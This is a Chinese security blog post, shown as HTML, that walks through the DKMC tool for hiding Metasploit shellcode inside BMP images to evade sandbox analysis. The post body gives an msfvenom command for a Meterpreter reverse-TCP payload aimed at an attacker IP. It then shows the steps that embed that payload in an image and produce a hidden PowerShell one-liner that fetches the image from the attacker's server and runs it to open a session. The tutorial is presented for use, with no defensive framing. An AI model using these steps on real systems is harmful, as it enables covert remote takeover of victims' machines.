@@ -1,0 +1,1131 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="Metasploit,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DKMC | bmp | Msf | kali linux 2017">
+<meta property="og:url" content="www.ggsec.cn/DKMC.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6c74ae2bc33479322e19ba48040ef3ef.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263654535.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263825342.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506264396655.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265200817.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265496004.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265578788.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265769879.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265917418.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266034961.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266228942.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266510548.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266631077.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266879696.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266911876.jpg">
+<meta property="og:updated_time" content="2018-12-21T06:56:05.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DKMC | bmp | Msf | kali linux 2017">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6c74ae2bc33479322e19ba48040ef3ef.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> DKMC | bmp | Msf | kali linux 2017 | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              DKMC | bmp | Msf | kali linux 2017
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2017-09-24T21:53:41+08:00" content="2017-09-24">
+            2017-09-24
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/Metasploit/" itemprop="url" rel="index">
+                  <span itemprop="name">Metasploit</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/DKMC.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="DKMC.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/DKMC.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6c74ae2bc33479322e19ba48040ef3ef.jpg" alt="enter description here"><br><a id="more"></a></p>
+<p>GitHub： <a href="https://github.com/Mr-Un1k0d3r/DKMC" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/DKMC</a><br>youtube：<a href="https://youtu.be/xGZ0X5eA2IA" target="_blank" rel="noopener">https://youtu.be/xGZ0X5eA2IA</a></p>
+<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
+<script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
+<script>
+    var ivaInstance = new Iva('ivaLive', {
+        appkey: 'By9WGzBIx', //应用标示
+        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/DKMC.mp4', //视频
+        title: 'test', //视频标题，后台视频管理中的标题
+        cover: '' //视频封面，只有在autoplay:false才可生效
+    });
+</script>
+<script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>
+
+<p>和往常一样打开一些国外网站，吸收他们的知识，但是有个视频确是深深的吸引了我的眼球，也是一个不错的项目和思路，今天我就给我分享一下这款工具的使用。</p>
+<h2 id="1-Don’t-Kill-My-Cat-DKMC"><a href="#1-Don’t-Kill-My-Cat-DKMC" class="headerlink" title="1.Don’t Kill My Cat (DKMC)"></a>1.Don’t Kill My Cat (DKMC)</h2><p>DKMC是一个工具，它产生存储在多边形图片内的模糊的shellcode。 该图片是100％有效的，还有100％有效的shellcode。 这个想法是避免沙盒分析，因为它是一个简单的“合法”图片。 现在，该工具依靠PowerShell来执行最终的shellcode有效负载。</p>
+<p>基本流程（过程）<br>1.生成shellcode （msfvenom）<br>2.将msf的shellcode嵌入到图片内<br>3.PowerShell下载图片并执行图片作为shellcode<br>4.得到 shell</p>
+<h2 id="2-安装使用"><a href="#2-安装使用" class="headerlink" title="2.安装使用"></a>2.安装使用</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Mr-Un1k0d3r/DKMC </span><br><span class="line">$ cd DKMC</span><br><span class="line">$ mkdir output</span><br></pre></td></tr></table></figure>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg" alt="enter description here"></p>
+<h2 id="3-使用前准备"><a href="#3-使用前准备" class="headerlink" title="3.使用前准备"></a>3.使用前准备</h2><p>1.将所有类型的图片都转换bmp格式,关于如何转换可自行百度在线转换地址。<br>我这里已经提前转换好了<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263654535.jpg" alt="enter description here"></p>
+<p>2.准备一枚由msfvenom  生成的PAYLOAD，使用为未初始化的格式</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263825342.jpg" alt="enter description here"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORt=4444 -f raw &gt;demon</span><br></pre></td></tr></table></figure>
+<p>3.启动msfconsole （控制台），进行监听</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506264396655.jpg" alt="enter description here"></p>
+<h2 id="4-正式使用DKMC功能"><a href="#4-正式使用DKMC功能" class="headerlink" title="4.正式使用DKMC功能"></a>4.正式使用DKMC功能</h2><p>首先进入它的使用界面<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg" alt="enter description here"></p>
+<p>首先来简单介绍一下 </p>
+<pre>
+1.sc功能 是将msf生成的raw文件 转换位shellcode代码
+2.gen 功能 是将其msf的shellcode注入到BMP 图片中
+3.ps 功能将其BMP的图片转换为powershell代码
+4.web 功能 将其开启web功能
+</pre>
+
+<h2 id="1-我们首先要用到的是sc功能"><a href="#1-我们首先要用到的是sc功能" class="headerlink" title="1.我们首先要用到的是sc功能"></a>1.我们首先要用到的是sc功能</h2><p>（将其msf的shellcode注入到BMP 图片中）</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265200817.jpg" alt="enter description here"></p>
+<p>设置msfvenom 生成的文件路径，然后run 生成shellcode</p>
+<p><pre><br>(shellcode)&gt;&gt;&gt; set source demon<br>    [+] source value is set.<br>(shellcode)&gt;&gt;&gt; run<br></pre><br>将其shellcode代码进行保存，或者保存到文本文档 ，一会需要用到。<br>我们使用exit 退出当前模块，回到主菜单界面</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265496004.jpg" alt="enter description here"></p>
+<h2 id="2-gen-功能"><a href="#2-gen-功能" class="headerlink" title="2.gen 功能"></a>2.gen 功能</h2><p>（是将其msf的shellcode注入到BMP 图片中）</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265578788.jpg" alt="enter description here"></p>
+<p>这里需要设置两个地方一个是<br>1.转换后的bmp图片文件  2.设置shellcode</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265769879.jpg" alt="enter description here"></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265917418.jpg" alt="enter description here"></p>
+<p>之后run ，output中会生成一个新的bmp 是由msfpayload注入生成的，之后我们还是一样exit ，退回主界面。使用ps功能</p>
+<h2 id="3-ps功能"><a href="#3-ps功能" class="headerlink" title="3.ps功能"></a>3.ps功能</h2><p>(功能将其BMP的图片转换为powershell代码)<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266034961.jpg" alt="enter description here"></p>
+<p>这里需要设置的是url 这块，格式  set url  <a href="http://ip地址" target="_blank" rel="noopener">http://ip地址</a> ：端口号 /x.bmp</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266228942.jpg" alt="enter description here"></p>
+<p><pre><br>(powershell)&gt;&gt;&gt; set url <a href="http://192.168.1.103:8081/output-1506265715.bmp" target="_blank" rel="noopener">http://192.168.1.103:8081/output-1506265715.bmp</a><br>    [+] url value is set.<br>(powershell)&gt;&gt;&gt; run<br>    [+] Powershell script:<br>powershell.exe -nop -w hidden<br></pre><br>复制powershell代码  到文本文档 （可将其编辑格式为bat 或者ps1 即可）（本文不编辑其他格式直接复制粘贴代码）</p>
+<p>4.web功能<br>（开启web服务）</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266510548.jpg" alt="enter description here"></p>
+<p>folder  我这里就不设置他 ，因为bmp 生成的默认地址就是这个，需要改动的是我之前设置了url端口为8081，所以我这里也需要设置的一样为8081</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266631077.jpg" alt="enter description here"></p>
+<h2 id="5-运行代码，得到会话"><a href="#5-运行代码，得到会话" class="headerlink" title="5.运行代码，得到会话"></a>5.运行代码，得到会话</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266879696.jpg" alt="enter description here"></p>
+<p>得到会话，（这里我直接复制粘贴代码，可以选择将其编辑为bat、ps1、exe等格式运行）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266911876.jpg" alt="enter description here"></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag">#Metasploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/POC-calc.html" rel="prev">POC_calc | window 10</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/secist-shellcode.html" rel="next">我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="DKMC.html" data-title="DKMC | bmp | Msf | kali linux 2017" data-url="www.ggsec.cn/DKMC.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">156</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://bestsec.net" target="_blank">Bang'Blog</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=377915817&auto=0&height=430"></iframe>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#视频演示："><span class="nav-number">1.</span> <span class="nav-text">视频演示：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Don’t-Kill-My-Cat-DKMC"><span class="nav-number">2.</span> <span class="nav-text">1.Don’t Kill My Cat (DKMC)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-安装使用"><span class="nav-number">3.</span> <span class="nav-text">2.安装使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-使用前准备"><span class="nav-number">4.</span> <span class="nav-text">3.使用前准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-正式使用DKMC功能"><span class="nav-number">5.</span> <span class="nav-text">4.正式使用DKMC功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-我们首先要用到的是sc功能"><span class="nav-number">6.</span> <span class="nav-text">1.我们首先要用到的是sc功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-gen-功能"><span class="nav-number">7.</span> <span class="nav-text">2.gen 功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ps功能"><span class="nav-number">8.</span> <span class="nav-text">3.ps功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-运行代码，得到会话"><span class="nav-number">9.</span> <span class="nav-text">5.运行代码，得到会话</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2019
+  </span>
